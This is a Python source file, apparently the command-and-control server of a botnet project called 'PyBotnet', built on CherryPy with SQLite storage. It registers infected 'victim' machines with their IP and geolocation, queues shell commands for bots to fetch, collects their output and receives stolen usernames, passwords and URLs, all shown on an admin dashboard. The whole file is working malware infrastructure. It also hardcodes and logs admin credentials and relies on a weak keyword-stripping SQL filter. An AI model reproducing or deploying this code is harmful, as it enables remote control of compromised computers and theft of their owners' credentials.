import json
import base64
import Crypto
from Crypto.Cipher import AES
from Crypto.Hash import SHA512,MD5
import cherrypy 
from jinja2 import Template
import sqlite3
from cherrypy._cperror import HTTPRedirect

#Variables
HOST = '127.0.0.1'
PORT = 8080
KEY = b'3b732d7aaaefb3d3b68be37f04292a1c' #AES_object.encrypt(base64.b64encode(b'Mik317@root')).hex()
ADMIN = 'Mik317@root' #change the admin name
PASS = base64.b64encode(AES.new(KEY, AES.MODE_CBC).encrypt(KEY).hex().encode()).decode()
PASS2 = 'Mik317@root'
API = 'Insert your API Key for google maps' #generate it using this doc: https://developers.google.com/maps/documentation/embed/get-api-key

#HTML and dir variables
PATH = 'C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\C&C\\' #change with your absolute path of the project
PATH_V = 'C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\API\\' #path files where victim can call API

SQL_EXP = ['SELECT', '\'', '"', ';', 'INSERT', 'DROP', 'TABLE', 'FROM', 'WHERE', 'SLEEP()', '#'] #possible sql expressions that can lead to sql inj

#Other variables
JSON_DEC = json.JSONDecoder()

#DBs' Variables
DB_PATH = "C:\\Users\\MIKI\\workspace1\\PythonProject\\PyBotnet\\Server\\DBs\\" #change the path

cherrypy.config.update({'server.socket_host': HOST, 'server.socket_port': PORT})

#Useful methods
def get_credentials():
    cherrypy.log("ADMIN: {0} & PASS: {1}".format(ADMIN,PASS))
    cherrypy.log("KEY: {0}".format(KEY.decode()))
    return ''

def authenticate():
    cherrypy.session.acquire_lock()
    loggedin = cherrypy.session.get('LoggedIn', None)
    cherrypy.session.save()
    if not loggedin:
        raise cherrypy.InternalRedirect('/')
    cherrypy.config.update({'tools.staticdir.index': 'dashboard.html'})
cherrypy.tools.authenticate = cherrypy.Tool('before_finalize', authenticate,priority=59)

def bots_exec(query):
    BOTS_DB = sqlite3.connect(DB_PATH+'bots.db')
    BOTS_EXE = BOTS_DB.cursor()
    res = BOTS_EXE.execute(query).fetchall()
    BOTS_DB.commit()
    BOTS_EXE.close()
    BOTS_DB.close()
    return res
    
def cmds_exec(query):
    CMDS_DB = sqlite3.connect(DB_PATH+'cmds.db')
    CMDS_EXE = CMDS_DB.cursor()
    res = CMDS_EXE.execute(query).fetchall()
    CMDS_DB.commit()
    CMDS_EXE.close()
    CMDS_DB.close()
    return res

def creds_exec(query):
    CREDS_DB = sqlite3.connect(DB_PATH+'creds.db')
    CREDS_EXE = CREDS_DB.cursor()
    res = CREDS_EXE.execute(query).fetchall()
    CREDS_DB.commit()
    CREDS_EXE.close()
    CREDS_DB.close()
    return res

def anti_sql(query):
    query = str(query)
    for x in SQL_EXP:
        if x in query or x.lower() in query:
            query = query.replace(x, '')
            query = query.replace(x.lower(), '')
    return query

#Server
class Server(object):
        
    @cherrypy.expose
    def login(self):
        html = open(PATH+'login.html','r').read()
        template = Template(html)
        return template.render()
    
    @cherrypy.expose
    def verify_login(self,user,passwd, key):
        if user == ADMIN and passwd == PASS or passwd == PASS2:
            if key == KEY.decode():
                cherrypy.session['LoggedIn'] = 'LoggedIn'
                cherrypy.log('Logged In ---> IP: '+cherrypy.request.remote.ip)
            raise cherrypy.HTTPRedirect("/dashboard/")
        else:
            raise cherrypy.HTTPRedirect("/")
        return 
    
    @cherrypy.tools.authenticate()
    @cherrypy.expose
    def logout(self):
        cherrypy.lib.sessions.expire()
        raise cherrypy.HTTPRedirect("/")
        return 

    @cherrypy.tools.authenticate()
    @cherrypy.expose
    def dashboard(self):
        html = open(PATH+'DashBoard\\dashboard.html','r').read()
        template = Template(html)
        db = bots_exec('SELECT DISTINCT * FROM Bots')
        win = int(bots_exec('SELECT COUNT(DISTINCT Key) FROM Bots WHERE Os = "Windows"')[0][0])
        unix = int(bots_exec('SELECT COUNT(DISTINCT Key) FROM Bots WHERE Os = "Linux"')[0][0])
        mac = int(bots_exec('SELECT COUNT(DISTINCT Key) FROM Bots WHERE Os = "Darwin"')[0][0])
        bots_num = int(bots_exec('SELECT COUNT(DISTINCT Key) FROM Bots')[0][0])
        return template.render({'db':db, 'win':win, 'unix':unix, 'mac':mac, 'botsnum':bots_num})
    
    @cherrypy.expose
    @cherrypy.tools.json_in()
    def welcome(self):
        key = anti_sql(Crypto.Hash.MD5.new(Crypto.Hash.SHA512.new(cherrypy.request.json.get('USER').encode()).hexdigest().encode()).hexdigest())
        user = anti_sql(cherrypy.request.json.get('USER'))
        uname = anti_sql(cherrypy.request.json.get('UNAME'))
        geo = anti_sql(cherrypy.request.json.get('GEO'))
        ip = anti_sql(cherrypy.request.json.get('IP'))
        lat = anti_sql(cherrypy.request.json.get('LAT'))
        long = anti_sql(cherrypy.request.json.get('LONG'))
        os = anti_sql(cherrypy.request.json.get('OS'))
        html = open(PATH_V+'welcome.html','r').read()
        bots_exec('INSERT INTO Bots VALUES("'+user+'","'+uname+'","'+geo+'","'+ip+'","'+lat+'","'+long+'","'+os+'","'+key+'")') 
        template = Template(html)
        return template.render({'key':key})
    
    @cherrypy.expose
    @cherrypy.tools.authenticate()
    def view_bot(self, id):  #id = user encoded = key
        id = anti_sql(str(id))
        html = open(PATH+'DashBoard\\bots.html','r').read()
        template = Template(html)
        creds = ''
        if id == "all":
            db = bots_exec('SELECT DISTINCT * FROM Bots')
            creds = creds_exec('SELECT * FROM Creds')
        else:
            db = bots_exec('SELECT DISTINCT * FROM Bots WHERE Key="'+id+'"')
            creds = creds_exec('SELECT * FROM Creds WHERE Key="'+id+'"')         
        return template.render({'id':id, 'db':db, 'db_creds':creds, 'api':API})
    
    @cherrypy.expose
    def check_cmd(self, id):
        id = anti_sql(str(id))
        html = open(PATH_V+'get_cmd.html','r').read()
        template = Template(html)
        db = cmds_exec('SELECT Inp FROM CmdsIn WHERE Key="'+id+'"')
        return template.render({'db':db})
    
    @cherrypy.expose
    @cherrypy.tools.authenticate()
    def cmd(self):
        html = open(PATH+'DashBoard\\cmd.html','r').read()
        template = Template(html) 
        db = cmds_exec('SELECT DISTINCT * FROM CmdsOut') 
        return template.render({'db':db})
    
    @cherrypy.expose
    @cherrypy.tools.authenticate()
    def insert_cmd(self, id, inp):
        id = anti_sql(str(id))
        inp = anti_sql(str(inp))
        cmds_exec('INSERT INTO CmdsIn VALUES ("'+id+'","'+inp+'")')
        raise HTTPRedirect('/cmd/')  
        return ''
    
    @cherrypy.expose
    @cherrypy.tools.authenticate()
    def cmd_view(self, id):
        html = open(PATH+'DashBoard\\cmd.html','r').read()
        template = Template(html) 
        id = anti_sql(str(id))
        db = cmds_exec('SELECT DISTINCT * FROM CmdsOut WHERE Key="'+id+'"')
        return template.render({'db':db, 'id':id})
    
    @cherrypy.expose
    @cherrypy.tools.json_in()
    def cmd_out(self): #key == id
        id = anti_sql(str(cherrypy.request.json.get('KEY'))) 
        out = anti_sql(str(cherrypy.request.json.get('OUT')))
        inp = anti_sql(str(cherrypy.request.json.get('IN')))
        cmds_exec('INSERT INTO CmdsOut VALUES ("'+id+'","'+out+'","'+inp+'")')
        return ''
    
    @cherrypy.expose
    @cherrypy.tools.json_in()
    def insert_creds(self):
        key = anti_sql(cherrypy.request.json.get('KEY'))
        user = anti_sql(cherrypy.request.json.get('USER'))
        passwd = anti_sql(cherrypy.request.json.get('PASS'))
        url = anti_sql(cherrypy.request.json.get('URL'))
        creds_exec('INSERT INTO Creds VALUES("'+key+'","'+user+'","'+passwd+'","'+url+'")')
        return ''

if __name__ == '__main__':

    try:
    
        conf = {
            '/':{
                'tools.staticdir.on': True,
                'tools.staticdir.dir': PATH,
                'tools.staticdir.index': 'login.html',
                'tools.sessions.on': True,
                'tools.sessions.storage_class' :cherrypy.lib.sessions.FileSession,
                'tools.sessions.storage_path' : PATH+"sessions\\",
                'log.screen' : True,
                'tools.sessions.name': 'LoggedIn',
                'tools.auth_basic.checkpassword': Server().verify_login,
                }
            }
        
        print(get_credentials())
        cherrypy.quickstart(Server(),'/', conf)

    except KeyboardInterrupt:
        cherrypy.engine.block()
        cherrypy.engine.stop()
        quit()
